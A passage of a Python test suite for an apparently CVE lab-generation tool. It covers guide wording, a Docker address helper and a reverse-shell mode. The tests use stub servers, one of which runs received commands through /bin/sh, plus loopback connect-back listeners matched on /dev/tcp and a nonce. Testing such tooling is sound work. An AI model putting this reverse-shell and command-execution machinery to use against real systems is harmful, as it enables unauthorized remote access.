        self.assertIn("only where you are authorized to test it", head)

    def test_the_closing_line_says_which_artifact_takes_what(self) -> None:
        guide = " ".join(written_kit(port=8080, record=PROVED)["LAB-POC.md"].split())
        self.assertIn(
            "`manual.sh` takes Docker service names only. `PoC.py` takes no "
            "argument for lab mode and one address for remote mode, and where "
            "you point that is yours to answer for -- only a host your "
            "engagement authorizes.",
            guide,
        )

    def test_the_section_shows_the_exact_invocation(self) -> None:
        guide = written_kit(port=8080, record=PROVED)["LAB-POC.md"]
        self.assertIn("## The address this lab publishes", guide)
        self.assertIn(
            'python3 PoC.py "$(bash manual.sh address vulnerable)"'
            " --input target_path=/canary",
            guide,
        )
        self.assertIn("container port 8080 on loopback", guide)
        flat = " ".join(guide.split())
        self.assertIn("holds one session for the whole run", flat)
        # The value in that command is the lab's own route, and a client's is
        # not: a command copied to a client would test a path that is not
        # there and report NOT_OBSERVED, which reads as "not vulnerable".
        self.assertIn("Against anyone else's instance they are theirs", flat)

    def test_a_refused_lab_is_shown_no_command_for_the_address(self) -> None:
        """The address is still real; what may be pointed at it is not.

        Remote mode refuses for three labs in four, so this is the common
        case, and the section says which of the two modes is unaffected.
        """
        guide = " ".join(written_kit(port=8080)["LAB-POC.md"].split())
        self.assertIn("## The address this lab publishes", guide)
        self.assertIn("Remote mode refuses for this lab", guide)
        self.assertIn("exits 2 without sending anything", guide)
        self.assertIn("Lab mode -- `PoC.py` with no argument", guide)
        self.assertNotIn('python3 PoC.py "$(bash manual.sh address', guide)

    def test_a_lab_with_no_declared_port_says_so_instead(self) -> None:
        guide = " ".join(written_kit(port=None, record=PROVED)["LAB-POC.md"].split())
        self.assertIn("## The address this lab publishes It does not.", guide)
        self.assertIn("generated before the contract asked for the port", guide)
        self.assertNotIn("bash manual.sh address", guide)

    def test_the_step_list_names_the_new_action(self) -> None:
        guide = written_kit(port=8080)["LAB-POC.md"]
        self.assertIn(
            "- `address` reprints the host address this build was published on.",
            guide,
        )


# --------------------------------------------------------------------------
# The stub product, and the two ways the fixture script is run against it.
# --------------------------------------------------------------------------


class _Product(BaseHTTPRequestHandler):
    """One route that needs a session and one that gives a shell.

    `seeded` stands in for what CVELab's setup did to the container before a
    manual action runs: with it, `/run` answers a caller that never logged
    in, which is the state `exploit` and `verify` meet. Without it the
    instance is as an operator finds one, and `/run` is refused until a login
    in the SAME session -- which is what makes the address path's session and
    its own seeding measurable rather than asserted.
    """

    seeded = False
    asked: list[tuple[str, dict]] = []

    def log_message(self, *_: object) -> None:
        pass

    def _answer(self, status: int, body: str) -> None:
        raw = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        length = int(self.headers.get("Content-Length") or 0)
        self.rfile.read(length)
        type(self).asked.append((parsed.path, parse_qs(parsed.query)))
        if parsed.path == "/login":
            raw = b"ok"
            self.send_response(200)
            self.send_header("Set-Cookie", "sid=lab-session; Path=/")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)
            return
        self._answer(404, "not found")

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        type(self).asked.append((parsed.path, query))
        if parsed.path != "/run":
            self._answer(404, "not found")
            return
        held = "sid=lab-session" in (self.headers.get("Cookie") or "")
        if not (held or type(self).seeded):
            self._answer(403, "forbidden")
            return
        command = (query.get("cmd") or [""])[0]
        output = "uid=0(root) gid=0(root)" if command == "id" else command.split(" ", 1)[-1]
        self._answer(200, "shell-ran " + output)


class _Serving:
    def __init__(self, seeded: bool) -> None:
        self.seeded = seeded

    def __enter__(self) -> tuple[str, list]:
        handler = type("_Bound", (_Product,), {"seeded": self.seeded, "asked": []})
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        host, port = self.server.server_address[:2]
        return f"{host}:{port}", handler.asked

    def __exit__(self, *_: object) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)


def stub(seeded: bool) -> _Serving:
    return _Serving(seeded)


def run_fixture(
    arguments: list[str], address: str, extra: dict, port: str | None = None
) -> tuple[str, str, int]:
    """The fixture script in its own interpreter, as an operator would run it.

    -I so nothing is imported from the fixture's own directory, and the port
    the script would otherwise have as a literal is handed to it: the stub
    binds an ephemeral one.
    """
    environment = dict(os.environ)
    environment.pop("CVELAB_MANUAL_ACTION", None)
    environment.pop("CVELAB_TARGET", None)
    environment.pop("CVELAB_BOUND", None)
    environment["CVELAB_FIXTURE_PORT"] = port or address.rsplit(":", 1)[1]
    environment.update({key: str(value) for key, value in extra.items()})
    finished = subprocess.run(
        [sys.executable, "-I", str(FIXTURE), *arguments],
        capture_output=True, text=True, env=environment, timeout=60,
    )
    return finished.stdout, finished.stderr, finished.returncode


def ran_address(port: int | None, published: str) -> str | None:
    """`bash manual.sh address vulnerable`, against a `docker` that is a script."""
    with tempfile.TemporaryDirectory() as temporary:
        lab = Path(temporary)
        artifacts = lab / "artifacts"
        artifacts.mkdir()
        (lab / "docker-compose.yml").write_text("services: {}\n", encoding="utf-8")
        deliverables._write_generic_manual_assets(
            "CVE-2026-0001", lab, artifacts, False, False, port
        )
        (artifacts / ".manual-state").write_text("vulnerable", encoding="utf-8")
        if port is not None:
            (artifacts / core.SHIPPED_MANUAL_PORTS_FILE).write_text(
                json.dumps({"services": {"vulnerable": {"ports": ["127.0.0.1::8080"]}}}),
                encoding="utf-8",
            )
        shim = lab / "bin"
        shim.mkdir()
        (shim / "docker").write_text(
            "#!/usr/bin/env bash\n"
            'for word in "$@"; do\n'
            '  if [[ "$word" == "port" ]]; then printf "%s\\n" ' + f'"{published}"' + "; exit 0; fi\n"
            "done\n"
            "exit 0\n",
            encoding="utf-8",
        )
        (shim / "docker").chmod(0o755)
        finished = subprocess.run(
            ["bash", str(artifacts / "manual.sh"), "address", "vulnerable"],
            capture_output=True, text=True, timeout=60,
            env={**os.environ, "PATH": f"{shim}:{os.environ['PATH']}"},
        )
        if finished.returncode != 0:
            return None
        return finished.stdout.strip()


class _Executing(_Product):
    """The same product with the weakness it declares, actually working.

    `_Product` answers `/run` by echoing the command back, which is enough to
    measure that a line reaches the route as one command. A connect-back is
    not a line to be echoed: it has to RUN, or nothing connects back and the
    session mode has nothing to carry. So this one runs it, and the mode is
    measured instead of asserted.

    The command runs here and nowhere else: it is the one this test's own
    artifact composed, sent to a server bound on this machine's loopback, and
    the shell it starts connects straight back to the listener in the same
    process tree.
    """

    spawned: list = []

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        type(self).asked.append((parsed.path, query))
        if parsed.path != "/run":
            self._answer(404, "not found")
            return
        held = "sid=lab-session" in (self.headers.get("Cookie") or "")
        if not (held or type(self).seeded):
            self._answer(403, "forbidden")
            return
        command = (query.get("cmd") or [""])[0]
        child = subprocess.Popen(
            ["/bin/sh", "-c", command], stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        type(self).spawned.append(child)
        try:
            said = child.communicate(timeout=4)[0].decode("utf-8", "replace")
        except subprocess.TimeoutExpired:
            # A connect-back holds the request open for as long as the shell
            # it started lives, which is the behaviour the mode is written
            # for: it sends and does not wait.
            said = "(still running)"
        self._answer(200, "shell-ran " + said)


class _Connecting(_Product):
    """A product that connects back itself, as a build with no bash would.

    `_Executing` runs the command, so what connects back is a real shell and
    the session is whatever that shell does. This one runs nothing: it reads
    the address and the nonce out of the command it was sent and connects
    back with the behaviour the test asked for. That is how the three cases
    the exit status has to tell apart are reached on demand -- a connection
    that carries nothing, a connection that carries a few bytes and dies,
    and a connection that carries a session -- without waiting for a shell
    to misbehave on cue.

    `presents` False is the impostor: it connects to the listener and acts
    like a shell without the nonce, which is a session in something that is
    not the build.
    """

    WHERE = re.compile(r"/dev/tcp/([0-9.]+)/([0-9]+)")
    TOKEN = re.compile(r"\b[0-9a-f]{32}\b")
    behaves = "session"
    presents = True
    knocks: list = []

    @classmethod
    def knock(cls, host: str, port: int, nonce: str) -> None:
        held = socket.create_connection((host, port), timeout=10)
        cls.knocks.append(held)
        if cls.presents:
            held.sendall((nonce + "\n").encode())
        if cls.behaves == "silent":
            held.close()
            return
        held.sendall(b"sh-4.4$ ")
        if cls.behaves == "dies":
            time.sleep(0.5)
            held.close()
            return
        while True:
            with contextlib.suppress(OSError):
                line = held.recv(4096)
                if not line:
                    return
                if b"id" in line:
                    held.sendall(b"uid=0(root) gid=0(root)\nsh-4.4$ ")
                if b"exit" in line:
                    held.close()
                    return
                continue
            return

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        type(self).asked.append((parsed.path, query))
        if parsed.path != "/run":
            self._answer(404, "not found")
            return
        command = (query.get("cmd") or [""])[0]
        where = self.WHERE.search(command)
        token = self.TOKEN.search(command)
        if where and token:
            threading.Thread(
                target=type(self).knock,
                args=(where.group(1), int(where.group(2)), token.group(0)),
                daemon=True,
            ).start()
        self._answer(200, "shell-ran " + command)


class _Knocking:
    """`_Connecting` on a loopback port, with the behaviour to use."""

    def __init__(self, behaves: str = "session", presents: bool = True) -> None:
        self.behaves = behaves
        self.presents = presents

    def __enter__(self) -> tuple[str, list]:
        handler = type("_Bound", (_Connecting,), {
            "seeded": True, "asked": [], "knocks": [],
            "behaves": self.behaves, "presents": self.presents,
        })
        self.handler = handler
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        host, port = self.server.server_address[:2]
        return f"{host}:{port}", handler.asked

    def __exit__(self, *_: object) -> None:
        for held in self.handler.knocks:
            with contextlib.suppress(OSError):
                held.close()
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)


class _Working:
    """`_Executing` on a loopback port, and the children it left behind."""

    def __enter__(self) -> tuple[str, list]:
        handler = type("_Bound", (_Executing,), {"seeded": False, "asked": [], "spawned": []})
        self.handler = handler
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        host, port = self.server.server_address[:2]
        return f"{host}:{port}", handler.asked

    def __exit__(self, *_: object) -> None:
        for child in self.handler.spawned:
            if child.poll() is None:
                child.terminate()
                with contextlib.suppress(subprocess.TimeoutExpired):
                    child.wait(timeout=5)
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)


class TheSessionIsCarriedToTheProductTests(unittest.TestCase):
    """`--reverse-shell`, measured end to end, because nothing else can be.

    Of the labs in the archive whose declared evidence is command execution,
    every single one names something in `fidelity.simulated_components`, so
    ZERO qualify for this mode and it ships dormant. That is the owner's
    decision and not an oversight -- a pseudo-shell on an adapter-routed lab
    is visibly the same thing as one echoed command, and a session prompt is
    the artifact most easily mistaken for real access.

    It also means that without this class the whole proof path -- listener,
    connect-back, relay, exit status -- would be code that never runs
    anywhere, which is the defect the feature was written against. So the
    lab here is synthetic and everything else is real: the validator beside
    these tests is the smallest script `_OPERATOR_CONTRACT` admits and
    implements the one-command form, the product is on a real socket and
    really runs what it is sent, and the shell that comes back is a shell.
    """

    def plan(self, **extra: object) -> dict:
        held = {
            "cve": "CVE-2026-0001",
            "lab_type": "END_TO_END_REPRODUCTION",
            "repository": "https://example.invalid/p.git",
            "exploit_contract": contract(),
            "fidelity": {"simulated_components": [], "vendor_product_started": True},
        }
        held.update(extra)
        return held

    def artifact(self, **extra: object) -> str:
        return field.emit_poc(
            "CVE-2026-0001", self.plan(**extra),
            FIXTURE.read_text(encoding="utf-8"),
            {"shipped": False, "reason": "nothing was proved against one instance",
             "reverse_shell": {"shipped": True, "form": "bash-devtcp"}},
        )

    def ran(
        self, text: str, *argv: str, typed: str = "", port: str = ""
    ) -> tuple[str, str, int]:
        environment = dict(os.environ)
        for name in ("CVELAB_MANUAL_ACTION", "CVELAB_TARGET", "CVELAB_BOUND"):
            environment.pop(name, None)
        if port:
            environment["CVELAB_FIXTURE_PORT"] = port
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / field.POC_NAME
            path.write_text(text, encoding="utf-8")
            finished = subprocess.run(
                [sys.executable, str(path), *argv], input=typed,
                capture_output=True, text=True, timeout=300, env=environment,
            )
        return finished.stdout, finished.stderr, finished.returncode

    def session(
        self, address: str, typed: str, *extra: str
    ) -> tuple[str, str, int]:
        return self.ran(
            self.artifact(), "--lab-address", address, "--reverse-shell",
            "--allow-shell", "--callback-bind", "127.0.0.1:0",
            "--callback-wait", "8", *extra,
            typed=typed, port=address.rsplit(":", 1)[1],
        )

    def test_the_mode_is_offered_for_a_lab_that_qualifies(self) -> None:
        offered, reason = field.reverse_shell_standing(
            self.plan(), FIXTURE.read_text(encoding="utf-8"),
            {"reverse_shell": {"shipped": True}},
        )
        self.assertTrue(offered, reason)
        self.assertIn("--reverse-shell", self.artifact())

    def test_a_shell_lands_on_the_product_and_the_session_is_carried(self) -> None:
        """The whole of it, once, against a product that runs what it is sent.

        What is held: the connect-back went out as ONE command through the
        lab program's own address path, something connected back to this
        file's own listener, a line typed at this end was answered by a shell
        at the other end, and the answer is on stdout while every word of
        this file's own is on stderr.
        """
        with _Working() as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 0, complained)
        # The target's own answer, which is not the text that was typed: a
        # connect-back that spawns a pty echoes its input, so `uid=` is the
        # check and `id` is not.
        self.assertIn("uid=", said)
        self.assertNotIn("uid=", "id\nexit\n")
        # One connect-back, through the address path's own session -- the
        # product refuses /run to a caller that has not logged in.
        sent = self.delivered(asked)
        self.assertEqual(len(sent), 1, sent)
        self.assertEqual([path for path, _ in asked][:2], ["/login", "/run"])
        # And the chrome is all on stderr, so a redirected run is the session.
        together = " ".join(complained.split())
        self.assertIn("connect-back landed:", complained)
        self.assertIn("real interactive access", together)
        self.assertNotIn("real interactive access", said)

    @staticmethod
    def listening(complained: str) -> str:
        """The address this file said it bound, read back out of its own chrome.

        On its own line now: the one that carried the bind AND what the build
        would be told was a 79-column line in a 78-column file at an address
        as short as 8.8.8.8.
        """
        return complained.partition("[listening on ")[2].partition("]")[0].strip()

    @staticmethod
    def told(complained: str) -> str:
        """The address this file said the build would be told to reach."""
        return (
            complained.partition("[the build will be told to reach ")[2]
            .partition("]")[0].strip()
        )

    def delivered(self, asked: list) -> list[str]:
        return [
            (query.get("cmd") or [""])[0]
            for path, query in asked if path == "/run"
        ]

    def filled(self, form: str, where: str) -> str:
        """A form with the two substitutions a test can predict.

        @NONCE@ is left standing, because a test cannot know it: it is made
        by the artifact at delivery time, per delivery. `masked` below puts
        it back so the rest of the form can be compared verbatim.
        """
        host, _, port = where.rpartition(":")
        return form.replace("@HOST@", host).replace("@PORT@", port)

    NONCE = re.compile(r"\b[0-9a-f]{32}\b")

    def masked(self, command: str) -> str:
        return self.NONCE.sub("@NONCE@", command)

    def nonces(self, asked: list) -> list[str]:
        """Every nonce the artifact actually put on the wire, in order."""
        found = [self.NONCE.search(one) for one in self.delivered(asked)]
        return [one.group(0) for one in found if one]

    # --- what the exit status is worth ------------------------------------

    def test_a_landing_that_carried_nothing_is_not_exit_zero(self) -> None:
        """`--reverse-shell && echo proved` printed `proved` for this.

        The connection is the build's own -- it presents the nonce, so the
        attribution is not in question -- and it closes without sending a
        byte. That is a socket and not a session: a connect-back can write
        its nonce and then fail to spawn anything at all, and the only
        evidence a shell was there is bytes coming back from one.

        Exit 1 and not 2: this file did not refuse, it delivered and got an
        answer. The byte count was printed on every run and gated nothing.
        """
        with _Knocking(behaves="silent") as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 1, complained)
        self.assertEqual(said, "")
        # Attributed, and said to be: the refusal is about the session being
        # empty and not about the connection being a stranger's.
        self.assertIn(field._REVERSE_LANDED_PREFIX, complained)
        self.assertIn("not one byte came back through it", complained)
        self.assertIn("is a socket and not a session", complained)
        self.assertNotIn("bytes came back from the build", complained)

    def test_a_session_that_carried_something_is_exit_zero(self) -> None:
        """And the line says how it ended, which the count cannot.

        A session that carried bytes and then died mid-way is a session that
        happened: it is this exit with the ending named, not a failure. The
        line between the two is one byte, and it is there because this mode
        interprets nothing in the stream -- there is no honest bar above "it
        carried something" that could be held without reading the session.
        """
        with _Knocking(behaves="session") as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 0, complained)
        self.assertIn("uid=", said)
        self.assertIn("bytes came back from the build", complained)
        self.assertNotIn("is a socket and not a session", complained)
        # The nonce is the handshake and is not counted as the build
        # answering, and it never reaches the operator's session either.
        self.assertNotIn(self.nonces(asked)[0], said)
        moved = int(
            complained.partition("ended")[2].partition(". ")[2].split()[0]
        )
        self.assertEqual(moved, len(said))

    def test_a_session_that_died_mid_way_still_happened(self) -> None:
        with _Knocking(behaves="dies") as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 0, complained)
        self.assertIn("sh-4.4$", said)
        self.assertIn("bytes came back from the build", complained)

    # --- what a landing is attributed to ----------------------------------

    def test_a_connection_with_no_nonce_is_not_a_landing(self) -> None:
        """The impostor. Nothing runs anywhere and something answers.

        Measured on the shape this replaces: an unrelated local process
        connected to the bound port, behaved like a shell, and the run
        exited 0 reporting `[connect-back landed: bash-devtcp, from
        127.0.0.1]` and N bytes "from the build". The operator had a session
        in something that was not the build and was told it was the build --
        and the generation-time proof would have recorded `shipped: True`
        with a form name that never ran.
        """
        with _Knocking(behaves="session", presents=False) as (address, asked):
            said, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 1, complained)
        # Not a session: nothing of the impostor's reaches the operator.
        self.assertEqual(said, "")
        self.assertNotIn(field._REVERSE_LANDED_PREFIX, complained)
        self.assertNotIn("bytes came back from the build", complained)
        # Said, and said as what it is, rather than passed off or dropped --
        # and said in a sentence that is true of a first line that was read
        # and was no nonce AND of one that had not been read yet, which the
        # one it replaces was not: it asserted that none of them carried a
        # nonce about connections whose nonce was still in flight.
        together = " ".join(complained.split())
        self.assertIn("not one was a landing", together)
        self.assertIn("1 had its first line read and it was no nonce", together)
        self.assertIn("0 had not been read yet when this gave up", together)
        self.assertNotIn("none carried a nonce this run issued", together)
        # And every form was still tried, because none of them landed.
        self.assertEqual(
            len(self.delivered(asked)), len(field.REVERSE_FORMS)
        )

    def test_the_form_named_is_the_form_that_caused_the_connection(self) -> None:
        """The slow form. No adversary needed: a cold start on a loaded host.

        The product delays the connect-back for the FIRST form past
        --callback-wait, so it lands while a later delivery is in flight.
        The landing used to be attributed to whichever delivery was most
        recently sent -- reported as nc-fifo while stdout was visibly a bash
        shell, with the header's FIFO-cleanup sentence describing a form that
        never executed. The nonce settles it: only the command this file sent
        for THAT form knew that nonce.
        """
        class _Slow(_Connecting):
            delay = 3.0
            seen: list = []

            @classmethod
            def knock(cls, host: str, port: int, nonce: str) -> None:
                cls.seen.append(nonce)
                if nonce == cls.seen[0]:
                    time.sleep(cls.delay)
                    _Connecting.knock.__func__(cls, host, port, nonce)

        handler = type("_Bound", (_Slow,), {
            "seeded": True, "asked": [], "knocks": [], "seen": [],
            "behaves": "session", "presents": True,
        })
        server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        host, port = server.server_address[:2]
        said, complained, code = self.ran(
            self.artifact(), "--lab-address", f"{host}:{port}",
            "--reverse-shell", "--allow-shell", "--callback-bind",
            "127.0.0.1:0", "--callback-wait", "1",
            typed="id\nexit\n", port=str(port),
        )
        self.assertEqual(code, 0, complained)
        self.assertIn("uid=", said)
        landed = complained.partition(field._REVERSE_LANDED_PREFIX)[2].partition(
            ","
        )[0].strip()
        # The first form, which is the one that actually ran -- not the last
        # one sent, which is what the delivery loop's own variable held.
        self.assertEqual(landed, field.REVERSE_FORMS[0][0])
        self.assertEqual(handler.seen[0], self.nonces(handler.asked)[0])
        # And the operator is told that later deliveries ran on the build.
        self.assertIn("is not the last of them", complained)

    def test_a_wildcard_bind_with_a_callback_says_what_it_is(self) -> None:
        """It used to be silent, which was the impostor's precondition.

        Refused only when --callback was absent, so `--callback-bind
        0.0.0.0:PORT --callback 127.0.0.1:PORT` bound every interface and
        said nothing. Named rather than refused: that pairing is the
        arrangement NAT and a port mapping need, and the nonce means the
        exposure is a port anyone can knock on rather than a session anyone
        can take. What stays true is stated, including the nonce's limit.
        """
        with _Knocking(behaves="session") as (address, asked):
            port = address.rsplit(":", 1)[1]
            said, complained, code = self.ran(
                self.artifact(), "--lab-address", address, "--reverse-shell",
                "--allow-shell", "--callback-bind", "0.0.0.0:0",
                # Host only, so the bound port is the one the build is told.
                "--callback", "127.0.0.1", "--callback-wait", "8",
                typed="id\nexit\n", port=port,
            )
        self.assertEqual(code, 0, complained)
        self.assertIn("uid=", said)
        together = " ".join(complained.split())
        self.assertIn("That bind is every interface on this machine", together)
        self.assertIn("closed unread and counted", together)
        self.assertIn("anything that can read this lab's own request", together)
        # A wildcard bind with no --callback is still refused, because there
        # is then no address to tell the build about at all.
        _, refused, code = self.ran(
            self.artifact(), "--lab-address", address, "--reverse-shell",
            "--allow-shell", "--callback-bind", "0.0.0.0:0", port=port,
        )
        self.assertEqual(code, 2)
        self.assertIn("bound to every interface", refused)

    # --- a nonce that arrives a beat late --------------------------------

    def _serving(self, handler: type) -> tuple[str, type]:
        """One of these products on a loopback port, torn down afterwards."""
        server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        host, port = server.server_address[:2]
        return f"{host}:{port}", handler

    def test_a_nonce_a_beat_late_is_still_the_session(self) -> None:
        """The window between the last delivery and the listener closing.

        `arrivals` is incremented at accept time on purpose, because the
        nonce read can still be in flight when the delivery loop gives up.
        What happened to such a connection was that the loop ended, `close()`
        set `released`, and the handler registered the landing after it: the
        session was lost AND the file then asserted that none of the
        connections that arrived had carried a nonce this run issued, which
        was false about the only one that had. Measured at a nonce written
        4.7 seconds after the connect against a one-second wait per form.

        Here the first line arrives in pieces and is finished only after
        every form has been delivered and the loop has had its grace, so the
        nonce is complete strictly after the loop gave up -- and nothing in
        the timing depends on how fast this machine is, because every piece
        refreshes the greeting read's own timeout.
        """
        class _Late(_Connecting):
            seen: list = []

            @classmethod
            def knock(cls, host: str, port: int, nonce: str) -> None:
                cls.seen.append(nonce)
                held = socket.create_connection((host, port), timeout=30)
                cls.knocks.append(held)
                held.sendall(nonce[:1].encode())
                gone = 1
                while gone < 24 and len(
                    [one for one, _ in cls.asked if one == "/run"]
                ) < len(field.REVERSE_FORMS):
                    time.sleep(1.0)
                    held.sendall(nonce[gone:gone + 1].encode())
                    gone += 1
                # The loop's own grace after the last delivery, and then the
                # rest of the nonce.
                time.sleep(2.5)
                held.sendall(nonce[gone:].encode() + b"\n")
                held.sendall(b"uid=0(root) gid=0(root)\n")
                with contextlib.suppress(OSError):
                    while held.recv(4096):
                        pass

        address, handler = self._serving(type("_Bound", (_Late,), {
            "seeded": True, "asked": [], "knocks": [], "seen": [],
        }))
        self.addCleanup(self._shut, handler)
        port = address.rsplit(":", 1)[1]
        said, complained, code = self.ran(
            self.artifact(), "--lab-address", address, "--reverse-shell",
            "--allow-shell", "--callback-bind", "127.0.0.1:0",
            "--callback-wait", "1", typed="exit\n", port=port,
        )
        self.assertEqual(code, 0, complained)
        self.assertIn("uid=", said)
        # Every form went out, so the loop really did run to the end before
        # this one finished presenting itself.
        self.assertEqual(
            len(self.delivered(handler.asked)), len(field.REVERSE_FORMS)
        )
        landed = complained.partition(field._REVERSE_LANDED_PREFIX)[2].partition(
            ","
        )[0].strip()
        self.assertEqual(landed, field.REVERSE_FORMS[0][0])
        # And the sentence that used to be printed instead is not.
        self.assertNotIn("not one was a landing", complained)

    @staticmethod
    def _shut(handler: type) -> None:
        for held in handler.knocks:
            with contextlib.suppress(OSError):
                held.close()

    def test_the_late_wait_is_only_paid_where_a_first_line_may_still_come(
        self,
    ) -> None:
        """The cost of that wait, charged to the case it exists for.

        Bounded by the seconds a greeting is given, and asked for only where
        a first line has not been read yet. Measured as a difference rather
        than against a clock, so the numbers hold on any machine: a run where
        nothing connects and a run where an impostor connects and speaks at
        once are both answered as soon as the deliveries run out, while a
        connection whose first line is still arriving is waited for.

        And the sentence, in both of the shapes it has to be true in. The one
        it replaces asserted that none of the connections that arrived
        "carried a nonce this run issued", which was a claim about
        connections whose first line had never been read.
        """
        class _Stranger(_Connecting):
            says = "line"

            @classmethod
            def knock(cls, host: str, port: int, nonce: str) -> None:
                held = socket.create_connection((host, port), timeout=60)
                cls.knocks.append(held)
                if cls.says == "line":
                    # A whole line, so the greeting read finishes at once --
                    # and no nonce of this run's, so it is not the landing.
                    held.sendall(b"not-a-nonce-of-this-run\n")
                    return
                if cls.says == "dribble":
                    # Never finishes a line, and refreshes the read's own
                    # timeout as it goes: still being read when the wait
                    # above runs out, which is the other half of the report.
                    for _ in range(12):
                        with contextlib.suppress(OSError):
                            held.sendall(b"x")
                        time.sleep(3.0)
                    return
                # Connects, says nothing, and does not close either.
                with contextlib.suppress(OSError):
                    while held.recv(4096):
                        pass

        def timed(address: str) -> tuple[float, str, int]:
            began = time.monotonic()
            _, complained, code = self.ran(
                self.artifact(), "--lab-address", address, "--reverse-shell",
                "--allow-shell", "--callback-bind", "127.0.0.1:0",
                "--callback-wait", "1", typed="exit\n",
                port=address.rsplit(":", 1)[1],
            )
            return time.monotonic() - began, " ".join(complained.split()), code

        def against(says: str) -> tuple[float, str, int]:
            address, handler = self._serving(type("_Bound", (_Stranger,), {
                "seeded": True, "asked": [], "knocks": [], "says": says,
            }))
            self.addCleanup(self._shut, handler)
            return timed(address)

        with stub(seeded=False) as (address, _):
            nobody, said_nobody, code_nobody = timed(address)
        spoke, said_spoke, code_spoke = against("line")
        mute, said_mute, code_mute = against("nothing")
        drip, said_drip, code_drip = against("dribble")
        for code in (code_nobody, code_spoke, code_mute, code_drip):
            self.assertEqual(code, 1)
        # Nothing connected, so there was nothing to wait for and nothing to
        # report about.
        self.assertNotIn("connection(s) arrived", said_nobody)
        # One did and had already spoken, so there was nothing to wait for
        # either: this must not cost the greeting wait.
        self.assertIn("1 had its first line read and it was no nonce", said_spoke)
        self.assertIn("0 had not been read yet", said_spoke)
        self.assertLess(spoke - nobody, field.REVERSE_GREETING_WAIT / 2)
        # One that says nothing at all IS waited for, and by the end of the
        # wait its read has run out, so it is reported as read and silent --
        # which the sentence says in as many words.
        self.assertIn("1 had its first line read and it was no nonce", said_mute)
        self.assertIn(
            f"it said nothing in the {field.REVERSE_GREETING_WAIT} seconds a "
            "greeting is given",
            said_mute,
        )
        self.assertGreater(mute - spoke, field.REVERSE_GREETING_WAIT / 2)
        # And one whose line is still arriving when the wait runs out is the
        # other half: not read yet, and said so rather than claimed about.
        # A dribbler is now READ and silent, not still-being-read, and that
        # is `greeting`'s bound having become total rather than per-`recv`.
        # Set once, the timeout bounded each read, so a connection sending
        # one byte at a time held its handler for the limit times the wait
        # -- measured still reading at 20 seconds against a bound of 8 --
        # and was reported as not read yet because it genuinely was not.
        # With a deadline across the reads it expires inside the bound, so
        # it HAS been given its chance and is reported as having said
        # nothing in it, which is the truer of the two sentences.
        self.assertIn("1 had its first line read", said_drip)
        self.assertIn("0 had not been read yet when this gave up", said_drip)
        self.assertIn("the ones it read came from", said_drip)

    def test_the_banner_does_not_claim_a_session_that_did_not_happen(self) -> None:
        """The headline is before the delivery, so it cannot be a fact.

        It read "a session, not a prompt" on every run, including the ones
        that end at exit 1 with nothing having connected back. The sentences
        stay -- they are the operator's reason to stop, and they have to be
        up before the first command goes out -- and the claim does not.
        """
        with stub(seeded=False) as (address, asked):
            _, complained, code = self.session(address, "id\nexit\n")
        self.assertEqual(code, 1)
        together = " ".join(complained.split())
        self.assertIn("What this opens is a session and not a prompt", together)
        self.assertIn("Nothing has been sent yet", together)
        self.assertNotIn("--reverse-shell: a session, not a prompt", together)
        # The banner itself is still there, before anything was delivered.
        self.assertIn("real interactive access", together)

    def test_a_later_connection_is_counted_after_the_session_not_before(
        self,
    ) -> None:
        """The accounting the listener's docstring is written for.

        A second connection arrives DURING the session, which is the only
        time a slow form can land on a live one. The count was read on the
        line after the landing, where it is always zero.
        """
        class _Twice(_Connecting):
            @classmethod
            def knock(cls, host: str, port: int, nonce: str) -> None:
                held = socket.create_connection((host, port), timeout=10)
                cls.knocks.append(held)
                held.sendall((nonce + "\n").encode())
                held.sendall(b"sh-4.4$ ")
                # Wait for the relay to be carrying this one before the
                # second arrives: the point of the measurement is a
                # connection landing DURING a live session, which is the
                # only time a slow form of this one's own can.
                held.recv(4096)
                spare = socket.create_connection((host, port), timeout=5)
                cls.knocks.append(spare)
                spare.sendall((nonce + "\n").encode())
                time.sleep(0.5)
                held.sendall(b"uid=0(root) gid=0(root)\n")
                held.close()

        handler = type("_Bound", (_Twice,), {
            "seeded": True, "asked": [], "knocks": [],
            "behaves": "session", "presents": True,
        })
        server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(thread.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        host, port = server.server_address[:2]
        said, complained, code = self.ran(
